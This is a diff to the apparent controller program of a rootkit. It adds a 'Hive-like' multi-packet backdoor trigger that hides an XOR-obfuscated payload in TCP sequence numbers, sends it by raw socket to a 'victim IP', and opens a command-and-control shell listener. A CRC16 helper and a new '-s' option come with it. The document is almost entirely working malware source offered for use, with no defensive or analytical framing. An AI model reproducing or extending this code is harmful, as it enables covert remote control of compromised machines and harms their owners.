@@ -83,6 +83,18 @@ char* getLocalIpAddress(){
     return IPbuffer;
 }
 
+unsigned short crc16(const unsigned char* data_p, unsigned char length){
+    unsigned char x;
+    unsigned short crc = 0xFFFF;
+
+    while (length--){
+        x = crc >> 8 ^ *data_p++;
+        x ^= x>>4;
+        crc = (crc << 8) ^ ((unsigned short)(x << 12)) ^ ((unsigned short)(x <<5)) ^ ((unsigned short)x);
+    }
+    return crc;
+}
+
 
 /*void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
@@ -242,6 +254,7 @@ void activate_command_control_shell_encrypted(char* argv){
     server_run(8500);
 }
 
+//For V2 backdoor - Sends secret packet that control state of hooks
 void hook_control_command(char* argv, int mode){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
@@ -297,6 +310,56 @@ void hook_control_command(char* argv, int mode){
     }
 }
 
+//Rootkit backdoor V3 being used - Hive-like
+void activate_command_control_shell_encrypted_multi_packet(char* argv){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
+    
+    //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
+    const int PAYLOAD_LEN = 12;
+    const int STREAM_PACKET_CAPACITY_BYTES = 4;
+    stream_t stream = build_standard_packet_stream_empty_payload(PAYLOAD_LEN/STREAM_PACKET_CAPACITY_BYTES, 8000, 9000, local_ip, argv);
+    char *payload = calloc(PAYLOAD_LEN, sizeof(char));
+    srand(time(NULL));
+    for(int ii=0; ii<PAYLOAD_LEN; ii++){
+        payload[ii] = (char)rand();
+    }
+    inet_pton(AF_INET, argv, (void*)(payload+0x01));
+    uint16_t port = htons(8000);
+    strncpy(payload+0x05, (char*)&port, 0x02);
+    char result[0x02];
+    char key[0x03] = CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL;
+    for(int ii=0; ii<0x02; ii++){
+        result[ii] = payload[0x05+ii] ^ key[ii];
+    }
+    strncpy(payload+0x08, result, 0x02);
+    uint16_t crc = crc16(payload, 10);
+    strncpy(payload+0x0A, (char*)&crc, 0x02);
+    //Rolling xor
+    for(int ii=1; ii<PAYLOAD_LEN; ii++){
+        char xor_res = payload[ii-1] ^ payload[ii];
+        strncpy(payload+ii, (char*)&(xor_res), 0x01);
+    }
+
+    stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, 0x0C);
+
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious stream of packets with the hidden payload
+    for(int ii=0; ii<stream.stream_length; ii++){
+        if(rawsocket_send(*(stream.packet_stream+ii*(sizeof(packet_t))))<0){
+            printf("["KRED"ERROR"RESET"]""An error occured at packet %i/%i. Is the machine up?\n", ii+1, stream.stream_length);
+            return;
+        }else{
+            printf("["KGRN"OK"RESET"]""Packet %i/%i successfully sent!\n", ii+1, stream.stream_length);
+        }
+    }
+    printf("["KGRN"OK"RESET"]""Packet stream successfully sent to the backdoor in completeness\n");
+    
+    server_run(8000);
+}
+
 
 void main(int argc, char* argv[]){
     if(argc<2){
@@ -316,7 +379,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:c:e:u:a:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:e:u:a:s:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -370,6 +433,17 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             hook_control_command(dest_address, 1);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 's':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Activating COMMAND & CONTROL with MULTI-PACKET backdoor trigger\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            activate_command_control_shell_encrypted_multi_packet(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
